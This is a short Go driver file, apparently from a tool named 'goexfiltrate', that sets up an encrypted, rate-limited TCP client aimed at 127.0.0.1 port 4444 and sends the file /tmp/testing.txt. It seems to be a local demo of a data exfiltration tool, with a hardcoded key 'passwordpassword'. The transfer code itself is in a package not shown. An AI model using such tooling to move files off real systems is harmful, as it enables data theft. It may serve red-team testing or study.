package main

import (
	"goexfiltrate/clients"

	log "github.com/sirupsen/logrus"
)

func main() {
	log.SetFormatter(&log.JSONFormatter{})
	log.SetLevel(log.DebugLevel)

	/*
		type TCPClient struct {
			TargetIP       string
			TargetPort     string
			Key            []byte
			ChunkSize      int
			EncryptionMode string
			Speed          int
			ID             string
		}
	*/

	client := clients.ControlClient{
		TargetIP:       "127.0.0.1",
		TargetPort:     "4444",
		Key:            []byte("passwordpassword"),
		ChunkSize:      1024,
		EncryptionMode: "aes",
		Speed:          1,
		ID:             "00000001",
	}

	client.TransferFile("/tmp/testing.txt")
}
